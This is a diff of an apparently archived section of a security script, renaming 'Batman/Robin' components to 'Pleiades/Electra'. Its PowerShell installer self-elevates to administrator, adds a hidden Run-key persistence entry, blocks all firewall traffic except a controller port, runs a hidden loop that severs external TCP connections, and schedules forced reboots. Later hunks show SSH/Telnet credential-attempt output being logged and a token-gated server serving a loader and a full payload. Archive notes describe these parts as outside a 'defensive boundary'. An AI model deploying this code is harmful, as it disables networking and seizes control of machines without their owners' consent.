+832:     cat > "$TEMP/pleiades_install.ps1" << 'WINPS'
 833: param($controller_ip, $controller_port, $limit=10)
 834: $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 835: if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
 836:     Start-Process powershell.exe "-File `"$PSCommandPath`" -controller_ip $controller_ip -controller_port $controller_port -limit $limit" -Verb RunAs
 837:     exit 0
 838: }
-839: $state_dir = "$env:ProgramData\BatmanRobin"
+839: $state_dir = "$env:ProgramData\PleiadesElectra"
 840: if (!(Test-Path $state_dir)) { New-Item -ItemType Directory -Force -Path $state_dir | Out-Null }
 841: $counter_file = Join-Path $state_dir 'bootcount.txt'
 842: $count = (Test-Path $counter_file) ? [int](Get-Content $counter_file) : 0
 843: if ($count -ge $limit) {
-844:     Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:$false -ErrorAction SilentlyContinue
+844:     Unregister-ScheduledTask -TaskName 'PleiadesElectraReboot' -Confirm:$false -ErrorAction SilentlyContinue
 845:     Remove-Item -Recurse -Force $state_dir -ErrorAction SilentlyContinue
 846:     exit 0
 847: }
 848: $count += 1
 849: Set-Content -Path $counter_file -Value $count
-850: $banner_script = Join-Path $state_dir 'bat-signal.ps1'
+850: $banner_script = Join-Path $state_dir 'pleiades-signal.ps1'
 851: @'
-852: while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      BATMAN & ROBIN ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
+852: while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      PLEIADES & ELECTRA ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
 853: '@ | Out-File -FilePath $banner_script -Encoding ASCII
 854: Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BatSignal' -Value "powershell.exe -WindowStyle Hidden -File `"$banner_script`"" -Force
 855: netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
-856: netsh advfirewall firewall add rule name="BatmanTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
-857: netsh advfirewall firewall add rule name="BatmanDNS" dir=out action=allow protocol=udp remoteport=53
-858: netsh advfirewall firewall add rule name="BatmanDHCP" dir=out action=allow protocol=udp remoteport=67,68
-859: $robin_script = Join-Path $state_dir 'robin.ps1'
+856: netsh advfirewall firewall add rule name="PleiadesTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
+857: netsh advfirewall firewall add rule name="PleiadesDNS" dir=out action=allow protocol=udp remoteport=53
+858: netsh advfirewall firewall add rule name="PleiadesDHCP" dir=out action=allow protocol=udp remoteport=67,68
+859: $electra_script = Join-Path $state_dir 'electra.ps1'
 860: @'
 861: while ($true) {
 862:     Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch '^127\.|^192\.168\.|^10\.' } | ForEach-Object { Remove-NetTCPConnection -LocalPort $_.LocalPort -RemotePort $_.RemotePort -RemoteAddress $_.RemoteAddress -Force -ErrorAction SilentlyContinue }
 863:     Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
 864: }
-865: '@ | Out-File -FilePath $robin_script -Encoding ASCII
-866: Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$robin_script`"" -PassThru
-867: $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:0 } }`""
+865: '@ | Out-File -FilePath $electra_script -Encoding ASCII
+866: Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$electra_script`"" -PassThru
+867: $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'PleiadesElectraReboot' -Confirm:0 } }`""
 868: $trigger = New-ScheduledTaskTrigger -AtStartup
-869: Register-ScheduledTask -TaskName "BatmanRobinReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
-870: Write-Host "Batman & Robin installed on Windows. Boot: $count / $limit"
+869: Register-ScheduledTask -TaskName "PleiadesElectraReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
+870: Write-Host "Pleiades & Electra installed on Windows. Boot: $count / $limit"
 871: WINPS
-872:     powershell.exe -ExecutionPolicy Bypass -File "$TEMP/batman_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
+872:     powershell.exe -ExecutionPolicy Bypass -File "$TEMP/pleiades_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
 873: fi
-874: BATMAN
-875:     chmod +x /etc/cheshire/batman-full.sh
+874: PLEIADES
+875:     chmod +x /etc/taygete/pleiades-full.sh
 ```
 
-## Beryl.sh:234-328
+## Taygete.sh:234-328
 
 Reason archived: active SSH/Telnet credential attempts are outside the clarified defensive boundary; replaced with local decoy-auth telemetry recorder.
 
@@ -665,11 +665,11 @@ Reason archived: active SSH/Telnet credential attempts are outside the clarified
 303: 
 304:     for res := range ch {
 305:         fmt.Printf("%s|%s|%s|%s\n", res.method, res.ip, res.user, res.pass)
-306:         if f, err := os.OpenFile("/run/purple/ouroboros_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0666); err == nil {
+306:         if f, err := os.OpenFile("/run/pleiades/pleiades-nexus_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0666); err == nil {
 307:             fmt.Fprintf(f, "CREDENTIAL_FINDING|%s|%s|%s\n", res.ip, res.user, res.pass)
 308:             f.Close()
 309:         }
-310:         if f, err := os.OpenFile("/run/purple/attacker_ips", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0644); err == nil {
+310:         if f, err := os.OpenFile("/run/pleiades/attacker_ips", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0644); err == nil {
 311:             fmt.Fprintln(f, res.ip)
 312:             f.Close()
 313:         }
@@ -687,10 +687,10 @@ Reason archived: active SSH/Telnet credential attempts are outside the clarified
 325: # ------------------------------------------------------------
 326: # 5. Build Bun sandbox (infinite tarpit) – unchanged
 327: # ------------------------------------------------------------
-328: build_purple_block_script() {
+328: build_pleiades_block_script() {
 ```
 
-## Beryl.sh:495-522
+## Taygete.sh:495-522
 
 Reason archived: payload/delivery endpoint naming did not match owner-authorized local helper semantics; replaced with local owner helper server.
 
@@ -709,11 +709,11 @@ Reason archived: payload/delivery endpoint naming did not match owner-authorized
 506:     fetch(req) {
 507:         const url = new URL(req.url);
 508:         if (url.pathname === '/loader.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
-509:             const loader = readFileSync('/etc/cheshire/loader.sh', 'utf8');
+509:             const loader = readFileSync('/etc/taygete/loader.sh', 'utf8');
 510:             return new Response(loader, { headers: { 'Content-Type': 'text/plain' } });
 511:         }
-512:         if (url.pathname === '/batman-full.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
-513:             const payload = readFileSync('/etc/cheshire/batman-full.sh', 'utf8');
+512:         if (url.pathname === '/pleiades-full.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
+513:             const payload = readFileSync('/etc/taygete/pleiades-full.sh', 'utf8');
 514:             return new Response(payload, { headers: { 'Content-Type': 'text/plain' } });
 515:         }
 516:         return new Response('Forbidden', { status: 403 });
@@ -726,7 +726,7 @@ Reason archived: payload/delivery endpoint naming did not match owner-authorized
 ```
 
 
-## Beryl.sh sandbox.js simple answers block archived 2026-05-29T05:00:11Z
+## Taygete.sh sandbox.js simple answers block archived 2026-05-29T05:00:11Z
 
 Reason archived: Replaced the minimal fake-shell command table with a host-owned decoy anti-recon layer that categorizes hostile recon, returns synthetic-only environment data, and emits telemetry for scoring. This archived block is retained for audit/reference only.
 
@@ -752,9 +752,9 @@ Reason archived: Replaced the minimal fake-shell command table with a host-owned
 ```
 
 
-## Beryl.sh sandbox decoy profile before host-bridge update 2026-05-29T07:09:01Z
+## Taygete.sh sandbox decoy profile before host-bridge update 2026-05-29T07:09:01Z
 
-Reason archived: Replaced the prior decoy response profile with a host/container-aware attacker-facing profile. Owner-visible host bridge capability state remains transparent in `/run/purple/host_bridge_capabilities` and `/var/lib/.sophia/host_bridge_capabilities`; hostile sessions receive synthetic-only responses.
+Reason archived: Replaced the prior decoy response profile with a host/container-aware attacker-facing profile. Owner-visible host bridge capability state remains transparent in `/run/pleiades/host_bridge_capabilities` and `/var/lib/.maia/host_bridge_capabilities`; hostile sessions receive synthetic-only responses.
 
 ```text
     const fakeFiles = (p) => ({
